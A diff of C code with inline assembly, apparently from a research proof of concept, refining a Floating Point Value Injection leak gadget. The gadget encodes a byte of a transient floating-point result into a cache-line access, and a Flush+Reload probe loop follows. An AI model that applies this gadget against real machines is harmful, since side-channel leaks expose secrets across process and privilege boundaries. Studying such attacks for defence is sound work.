@@ -113,7 +113,7 @@ int main(int argc, char *argv[]) {
     double dX = make_denormal();
     double dY = make_denormal();
     
-    printf("dX = 0x%016lx\n", *(uint64_t*)&dX);  // Print as hex
+    printf("dX = 0x%016lx\n", *(uint64_t*)&dX);
     printf("dY = 0x%016lx\n", *(uint64_t*)&dY);
     
 
@@ -129,24 +129,27 @@ int main(int argc, char *argv[]) {
             }
             mfence();
 
-           // 2. FPVI 
-            double z, temp1, temp2;
+            // 2. FPVI - TUTTO DENTRO ASSEMBLY!
+            int shift = byte_index * 8;
             asm volatile(
                 "movsd %[x], %%xmm0\n"
                 "movsd %[y], %%xmm1\n"
-                "divsd %%xmm1, %%xmm0\n"      // z = x / y
-                "movapd %%xmm0, %%xmm2\n"     // temp1 = z
-                "addsd %%xmm0, %%xmm2\n"      // temp1 = z + z (dipendente!)
-                "mulsd %%xmm2, %%xmm0\n"      // z = z * temp1 (dipendente!)
-                "movsd %%xmm0, %[z]\n"
-                : [z] "=m" (z)
-                : [x] "m" (dX), [y] "m" (dY)
-                : "xmm0", "xmm1", "xmm2"
+                "divsd %%xmm1, %%xmm0\n"
+                "divsd %%xmm1, %%xmm0\n"
+                
+                // Estrai byte e accedi cache SUBITO
+                "movq %%xmm0, %%rax\n"
+                "shr %%cl, %%rax\n"
+                "and $0xFF, %%rax\n"
+                "shl $12, %%rax\n"
+                "add %[buf], %%rax\n"
+                "movb (%%rax), %%al\n"
+                :
+                : [x] "m" (dX), [y] "m" (dY),
+                  [buf] "r" (reloadbuffer),
+                  "c" (shift)
+                : "xmm0", "xmm1", "rax", "memory"
             );
-
-            // SUBITO dopo leak
-            uint8_t byte = ((uint8_t*)&z)[byte_index];
-            *(volatile char*)(&reloadbuffer[byte * STRIDE]);
 
             // 3. Reload
             for(int j = 0; j < 256; j++) {
